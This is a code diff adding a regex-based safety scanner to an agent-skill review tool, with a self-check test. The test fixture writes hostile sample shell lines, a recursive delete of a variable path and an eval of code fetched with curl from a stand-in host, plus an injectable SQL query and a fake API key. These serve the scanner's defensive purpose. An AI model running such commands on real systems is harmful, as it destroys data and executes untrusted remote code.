@@ -13,6 +13,7 @@ carrying an explicit disposition.
 
 import argparse
 import json
+import re
 import sys
 from pathlib import Path
 
@@ -182,6 +183,97 @@ def print_status(root, state):
     )
 
 
+# Shapes the safety phase asks about that a pattern can locate. Each is a lead,
+# never a verdict: whether an interpolation is safe depends on where the value
+# came from, which only a reader can decide. They are seeded as `major` rather
+# than `blocking` for exactly that reason, so the run does not stall on a
+# scanner's opinion, and every one names the question it is evidence for.
+SAFETY_PATTERNS = (
+    (
+        # Recursive only. A plain `rm -f "$tmp"` removes one named file and is
+        # the ordinary spelling of a cleanup trap, so flagging it buried the
+        # recursive case that actually loses a tree. An unquoted variable is
+        # included whether recursive or not, since word splitting turns one
+        # path into several.
+        re.compile(r"\brm\s+(?:-[a-z]*\s+)*-?[a-z]*r[a-z]*\s+[\"']?\$|\brm\s+(?:-[a-z]+\s+)*\$[A-Za-z_{]"),
+        "deletes recursively, or without quoting, a path built from a variable",
+        "quote and validate the path before deleting, or confine the delete to a restorable snapshot",
+    ),
+    (
+        re.compile(r"\b(?:eval|sh|bash)\b[^\n]*\$\((?:\s*)?(?:curl|wget)\b"),
+        "executes code fetched at runtime",
+        "pin and verify what is fetched, or install it as a declared dependency instead",
+    ),
+    (
+        # Anchored on SQL grammar, not on the bare verb: `agents update --id
+        # "$X"` is a CLI invocation, and matching it made every command line
+        # carrying the word "update" a database finding.
+        re.compile(
+            r"\b(?:SELECT\b[^\n]*\bFROM\b|INSERT\s+INTO\b|UPDATE\b[^\n]*\bSET\b|DELETE\s+FROM\b)"
+            r"[^\n]*(?:'\s*\$|\"\s*\$|\$\{|%s\s*%|\+\s*\w+)",
+            re.IGNORECASE,
+        ),
+        "builds a query by interpolating a value",
+        "pass the value as a bound parameter rather than concatenating it into the statement",
+    ),
+    (
+        re.compile(
+            r"\b(?:api[_-]?key|secret|token|password|passwd)\b\s*[:=]\s*[\"']?[A-Za-z0-9_\-]{16,}",
+            re.IGNORECASE,
+        ),
+        "looks like a literal credential",
+        "read the secret from the environment or a secret store, and rotate this one if it is real",
+    ),
+)
+
+
+def safety_findings(skill_root):
+    """Locate the safety questions a pattern can find, as leads to settle.
+
+    The safety phase asks whether external input reaches a shell unvalidated
+    and whether secrets stay out of the tree. A reviewer answers those by
+    reading, and a reviewer who does not read carefully answers them by
+    assuming. Pointing at the lines first means the reading starts somewhere
+    specific, which is the same reason the format checks are seeded.
+
+    Deliberately not a security scanner. It reports shapes, and a shape is not
+    a defect: a recursive delete of a quoted snapshot path, inside the
+    coordinator that created that snapshot, is correct. Recorded as `major`, so
+    it must be dispositioned and argued with rather than silently inherited as
+    a blocking obligation.
+    """
+    findings = []
+    for path in sorted(skill_root.rglob("*")):
+        relative = path.relative_to(skill_root)
+        if not path.is_file() or excluded(relative.parts):
+            continue
+        if path.suffix.lower() not in TEXT_SUFFIXES or path.stat().st_size > MAX_BYTES:
+            continue
+        try:
+            lines = path.read_text(errors="replace").splitlines()
+        except OSError:
+            continue
+        for number, line in enumerate(lines, 1):
+            for pattern, summary, remedy in SAFETY_PATTERNS:
+                if not pattern.search(line):
+                    continue
+                findings.append(
+                    {
+                        "phase": "safety",
+                        "severity": "major",
+                        "summary": f"{relative.as_posix()}:{number} {summary}",
+                        "evidence": f"{relative.as_posix()}:{number}",
+                        "remedy": remedy,
+                        "disposition": None,
+                        "disposition_note": None,
+                        "source": "safety-scan",
+                        "recorded_at": now(),
+                    }
+                )
+                break
+    return findings
+
+
 def conformance_findings(skill_root):
     """Findings a parser can settle, recorded before any judgement is spent.
 
@@ -274,7 +366,7 @@ def command_init(args):
     # Non-empty when the format's own bounds are already broken: those have
     # exact answers, so spending a reviewer's judgement to rediscover them
     # wastes the expensive resource on the cheap question.
-    seeded = conformance_findings(skill_root)
+    seeded = conformance_findings(skill_root) + safety_findings(skill_root)
     for index, finding in enumerate(seeded, start=1):
         finding["id"] = f"F{index}"
     save_findings(root, seeded)
@@ -603,6 +695,40 @@ def command_self_check(_args):
         assert [item["severity"] for item in seeded] == ["blocking"], seeded
         assert seeded[0]["source"] == "conformance:description", seeded
         assert seeded[0]["id"] == "F1", seeded
+
+        # A skill can be perfectly conformant and still do the things the
+        # safety phase exists to ask about, and that phase used to open with
+        # nothing recorded: an agent that did not read the shell blocks
+        # carefully answered its questions by assuming. The shapes a pattern
+        # can locate are recorded first, so the reading starts somewhere.
+        risky = root / "risky"
+        (risky / "scripts").mkdir(parents=True)
+        (risky / "SKILL.md").write_text("---\nname: risky\ndescription: d\n---\n\n# Risky\n")
+        (risky / "scripts" / "clean.sh").write_text(
+            "#!/bin/sh\n"
+            'rm -rf "$TARGET"/\n'
+            'eval "$(curl -s http://example.invalid/i.sh)"\n'
+            "db.Query(\"SELECT * FROM users WHERE id = '$NAME'\")\n"
+            'api_key = "abcdef0123456789abcdef"\n'
+        )
+        risky_run = root / "risky-run"
+        execute("init", "--skill", risky, "--run-dir", risky_run)
+        leads = [
+            item
+            for item in json.loads((risky_run / "findings.json").read_text())["findings"]
+            if item["source"] == "safety-scan"
+        ]
+        assert len(leads) == 4, leads
+        assert {item["phase"] for item in leads} == {"safety"}, leads
+        # Never blocking: whether a shape is a defect depends on where the
+        # value came from, which is the reader's call, not the scanner's.
+        assert {item["severity"] for item in leads} == {"major"}, leads
+        for item in leads:
+            assert ":" in item["evidence"] and item["remedy"], item
+        # And silent on a skill that does none of it, or the leads are noise
+        # a reviewer learns to skip past.
+        assert safety_findings(plain) == [], safety_findings(plain)
+
         state = read_status(result.stdout)
         assert state["phases"] == list(ALWAYS_FIRST + ALWAYS_LAST), state["phases"]
         assert state["detail"]["surfaces"] == [], state
